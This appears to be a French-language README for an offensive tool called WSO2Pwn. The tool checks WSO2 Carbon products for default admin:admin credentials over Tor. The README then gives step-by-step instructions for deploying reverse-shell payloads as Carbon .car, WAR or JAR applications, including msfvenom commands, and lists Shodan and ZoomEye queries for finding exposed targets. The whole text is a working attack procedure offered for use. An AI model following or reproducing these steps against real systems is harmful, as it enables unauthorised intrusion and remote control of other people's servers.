# WSO2Pwn
check admin:admin (cred par défaut) sur les services type WSO2 (Identity, Entreprise Service Bus, Entreprise Integrator, Api Manager, ect..)
scan via tor en 127.0.0.1:9050

python WSOpwn.py -i dom -t 50


#Pour Pwn Entreprise Service Bus, Entreprise Integrator:

go IP:PORT/carbon et deploie une application carbon
le ZIP est une application Carbon (reverse shell)

il faut set l'ip, le port et le type de shell (/bin/bash, cmd.exe) dans pack_1.0.0.zip\HelloWorld_1.0.0\HelloWorld-1.0.0.xml
puis modifier l'extension en .car avant de déployer.

#Pour Pwn Api Manager, Governance Registry  :

go IP:PORT/carbon et deploie une application war

msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f war > meh.war

#Pour pwn Application Server:

go IP:PORT/carbon et deploie une application jar

msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f jar > meh.jar

#recherche targets :

shodan:carbon

zoomeye: "Server: WSO2 Carbon Server"
